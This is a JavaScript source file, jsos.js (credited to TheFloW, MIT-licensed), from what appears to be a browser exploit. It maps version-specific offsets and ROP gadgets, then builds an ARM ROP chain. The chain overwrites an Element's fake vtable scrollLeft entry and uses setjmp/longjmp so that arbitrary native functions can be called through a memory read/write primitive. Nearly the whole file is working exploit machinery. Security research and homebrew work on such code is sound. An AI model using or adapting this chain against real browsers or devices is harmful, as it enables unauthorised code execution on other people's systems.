/* jsos.js -- JavaScript on Steroids
 *
 * Copyright (C) 2020 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

function init_offsets(ver) {
  var version_dep = version_deps[ver];
  for (b in version_dep) {
    var offsets = version_dep[b].offsets;
    for (off in offsets) {
      if (offsets.hasOwnProperty(off)) {
        window[off] = offsets[off];
      }
    }
  }
}

function init_ggts(bases, caller, ver) {
  var version_dep = version_deps[ver];
  for (b in bases) {
    var results = {};
    if (bases.hasOwnProperty(b)) {
      var functions = version_dep[b].functions;
      for (fcn in functions) {
        if (functions.hasOwnProperty(fcn)) {
          window[fcn] = caller(functions[fcn] + bases[b]);
        }
      }
      var gadgets = version_dep[b].gadgets;
      for (ggt in gadgets) {
        if (gadgets.hasOwnProperty(ggt)) {
          window[ggt] = gadgets[ggt] + bases[b];
        }
      }
    }
  }
}

function get_caller(tmpmem, element, vtidx, fkvtable) {
  return function (fcn) {
    return function(r0, r1, r2, r3) {
      var allocate_tmp = init_memory(tmpmem);
      var context_size = 0x30;
      var eleobj_size = 0x22;

      var scontext = allocate_tmp(context_size * 4);
      var seleobj = allocate_tmp(eleobj_size * 4);

      // Save Element object
      for (var i = 0; i < eleobj_size; i++) {
        aspace32[seleobj / 4 + i] = aspace32[vtidx / 4 + i];
      }

      // Call setjmp
      aspace32[fkvtable / 4 + setscrollleft_off] = setjmp;
      element.scrollLeft = 0xdeadbabe;

      // Save jmp context
      for (var i = 0; i < context_size; i++) {
        aspace32[scontext / 4 + i] = aspace32[vtidx / 4 + i];
      }

      // Restore Element object
      for (var i = 0; i < eleobj_size; i++) {
        aspace32[vtidx / 4 + i] = aspace32[seleobj / 4 + i];
      }

      var r1values = allocate_tmp(0x1c);
      var r0values = allocate_tmp(0x1c);
      var r4values = allocate_tmp(0x10);
      var r8values = allocate_tmp(0x14);
      var r8values_0 = allocate_tmp(0x14);
      var r1values_1 = allocate_tmp(0x10);
      var retval = allocate_tmp(0x4);

      mymemset(retval, 0, 4);

      aspace32[(r1values + 0x00) / 4] = r0values;                    // r0
      aspace32[(r1values + 0x04) / 4] = r2;                          // r2
      aspace32[(r1values + 0x08) / 4] = r3;                          // r3
      aspace32[(r1values + 0x0c) / 4] = 0xDEADBEEF;                  // r8
      aspace32[(r1values + 0x10) / 4] = 0xDEADBEEF;                  // fp
      aspace32[(r1values + 0x14) / 4] = 0xDEADBEEF;                  // ip
      aspace32[(r1values + 0x18) / 4] = ldm_r0_r0_r1_r4_r8_fp_ip_pc; // pc

      aspace32[(r0values + 0x00) / 4] = r0;                          // r0
      aspace32[(r0values + 0x04) / 4] = 0xDEADBEEF;                  // r1
      aspace32[(r0values + 0x08) / 4] = r4values;                    // r4
      aspace32[(r0values + 0x0c) / 4] = r8values;                    // r8
      aspace32[(r0values + 0x10) / 4] = 0xDEADBEEF;                  // fp
      aspace32[(r0values + 0x14) / 4] = 0xDEADBEEF;                  // ip
      aspace32[(r0values + 0x18) / 4] = ldm_r8_r1_r6_ip_lr_pc;       // pc

      aspace32[(r8values + 0x00) / 4] = r1;                          // r1
      aspace32[(r8values + 0x04) / 4] = 0xDEADBEEF;                  // r6
      aspace32[(r8values + 0x08) / 4] = 0xDEADBEEF;                  // ip
      aspace32[(r8values + 0x0c) / 4] = ldm_r4_r3_r8_ip_pc;          // lr
      aspace32[(r8values + 0x10) / 4] = fcn;                         // pc

      aspace32[(r4values + 0x00) / 4] = retval;                      // r3
      aspace32[(r4values + 0x04) / 4] = r8values_0;                  // r8
      aspace32[(r4values + 0x08) / 4] = 0xDEADBEEF;                  // ip
      aspace32[(r4values + 0x0c) / 4] = ldm_r8_r1_r6_ip_lr_pc;       // pc

      aspace32[(r8values_0 + 0x00) / 4] = r1values_1;                // r1
      aspace32[(r8values_0 + 0x04) / 4] = 0xDEADBEEF;                // r6
      aspace32[(r8values_0 + 0x08) / 4] = 0xDEADBEEF;                // ip
      aspace32[(r8values_0 + 0x0c) / 4] = ldm_r1_r0_ip_lr_pc;        // lr
      aspace32[(r8values_0 + 0x10) / 4] = str_r0_r3_bx_lr;           // pc

      aspace32[(r1values_1 + 0x00) / 4] = scontext;                  // r0
      aspace32[(r1values_1 + 0x04) / 4] = 0xDEADBEEF;                // ip
      aspace32[(r1values_1 + 0x08) / 4] = 0xDEADBEEF;                // lr
      aspace32[(r1values_1 + 0x0c) / 4] = longjmp;                   // pc

      // Trigger ROP chain
      aspace32[fkvtable / 4 + setscrollleft_off] = ldm_r1_r0_r2_r3_r8_fp_ip_pc;
      element.scrollLeft = r1values;

      return aspace32[retval / 4];
    }
  };
}
